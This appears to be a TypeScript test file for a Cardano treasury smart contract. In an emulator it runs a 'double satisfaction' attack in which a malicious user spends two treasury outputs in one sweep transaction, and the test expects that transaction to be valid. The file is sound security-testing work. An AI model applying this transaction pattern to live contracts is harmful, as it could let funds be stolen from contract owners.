import { beforeEach, describe, test } from "bun:test";
import { Core, makeValue } from "@blaze-cardano/sdk";
import * as Data from "@blaze-cardano/data";
import { Emulator, EmulatorProvider } from "@blaze-cardano/emulator";
import { sampleTreasuryConfig, sampleVendorConfig, setupEmulator } from "../utilities.test";
import { loadTreasuryScript, loadVendorScript, unix_to_slot } from "../../shared";
import { sweep } from "../../treasury/sweep";
import {
  TreasuryConfiguration,
  TreasurySpendRedeemer,
  VendorConfiguration,
  VendorSpendRedeemer
} from "../../types/contracts";
import { Address, AssetId, Script, toHex } from "@blaze-cardano/core";

(BigInt.prototype as any).toJSON = function() {
  return this.toString()
} 

describe("Sweep multiple satisfaction attack", () => {
  let emulator: Emulator;
  let treasuryConfig0: TreasuryConfiguration;
  let treasuryConfig1: TreasuryConfiguration;
  let treasury0Input: Core.TransactionUnspentOutput;
  let treasury1Input: Core.TransactionUnspentOutput;
  let treasury0RefInput: Core.TransactionUnspentOutput;
  let treasury1RefInput: Core.TransactionUnspentOutput;
  let provider: EmulatorProvider;

  const printUtxosAtAddress = async (address:Address) => {
    console.log(JSON.stringify((await provider.getUnspentOutputs(address)).map(u => u.toCore()), null, 2))
  }

  beforeEach(async () => {
    emulator = await setupEmulator([], 2);
    treasuryConfig0 = await sampleTreasuryConfig(emulator, 0);
    treasuryConfig1 = await sampleTreasuryConfig(emulator, 1);
    const treasury0 = loadTreasuryScript(Core.NetworkId.Testnet, treasuryConfig0);
    treasury0Input = new Core.TransactionUnspentOutput(
      new Core.TransactionInput(Core.TransactionId("1".repeat(64)), 0n),
      new Core.TransactionOutput(
        treasury0.scriptAddress,
        makeValue(500_000_000_000n),
      ),
    );
    treasury0Input.output().setDatum(Core.Datum.newInlineData(Data.Void()));
    emulator.addUtxo(treasury0Input);

    const treasury1 = loadTreasuryScript(Core.NetworkId.Testnet, treasuryConfig1);
    treasury1Input = new Core.TransactionUnspentOutput(
      new Core.TransactionInput(Core.TransactionId("1".repeat(64)), 1n),
      new Core.TransactionOutput(
        treasury1.scriptAddress,
        makeValue(500_000_000_000n),
      ),
    );
    treasury1Input.output().setDatum(Core.Datum.newInlineData(Data.Void()));
    emulator.addUtxo(treasury1Input);

    provider = new EmulatorProvider(emulator);
    treasury0RefInput = emulator.lookupScript(treasury0.script.Script);
    treasury1RefInput = emulator.lookupScript(treasury1.script.Script);


  });

  describe("after the timeout", () => {
    beforeEach(() => {
      emulator.stepForwardToUnix(treasuryConfig0.expiration + 1n);
    });

    describe("a malicious user", () => {
      test("can steal funds meant to be swept through double satisfaction", async () => {
        await emulator.as("MaliciousUser", async (blaze, addr) => {
          printUtxosAtAddress(addr)
          await emulator.expectValidTransaction(
            blaze,
            blaze
              .newTransaction()
              // Sweep
              .addReferenceInput(treasury0RefInput)
              .addReferenceInput(treasury1RefInput)
              .addInput(treasury0Input, Data.serialize(TreasurySpendRedeemer, "SweepTreasury"))
              .addInput(treasury1Input, Data.serialize(TreasurySpendRedeemer, "SweepTreasury"))
              .setValidFrom(unix_to_slot(treasuryConfig0.expiration + 1000n))
              .setDonation(500_000_000_000n)
          );
          printUtxosAtAddress(addr)
        });
      });
    });
  });
});


